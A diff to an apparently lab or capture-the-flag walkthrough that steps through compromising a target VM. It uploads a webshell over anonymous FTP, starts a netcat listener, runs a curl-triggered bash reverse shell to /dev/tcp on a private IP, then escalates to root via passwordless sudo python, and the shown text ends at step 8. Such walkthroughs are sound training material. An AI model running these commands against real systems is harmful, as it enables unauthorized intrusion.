@@ -25,7 +25,19 @@ The objective of the challenge is to:
 2. Scan the target with `nmap` and identify the exposed FTP, SSH, and HTTP services.
 3. Enumerate the web server and discover the `/files` directory.
 4. Log in to FTP as `anonymous`, confirm upload access, and upload the included `exploit.php` webshell to the web-accessible files directory.
-5. Start `nc -lvnp 9001` on the testing machine and use the webshell to execute a URL-encoded reverse-shell command. This provides a `www-data` shell.
+5. On the authorized testing machine, start a listener:
+
+	```bash
+	nc -lvnp 9001
+	```
+
+	Then use the webshell to execute the following URL-encoded reverse-shell request, replacing `192.168.128.1` with the testing machine's Host-Only IP if needed:
+
+	```bash
+	curl --get --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.128.1/9001 0>&1'" "http://192.168.128.3/files/exploit.php"
+	```
+
+	This provides a `www-data` shell on the authorized target VM.
 6. Inspect `/` and `.runme.sh`, recover the `shrek` credential material, and use the recovered password to authenticate over SSH.
 7. Run `sudo -l` as `shrek`. The misconfiguration allows `/usr/bin/python3.5` to run as root without a password.
 8. Spawn a root shell with:
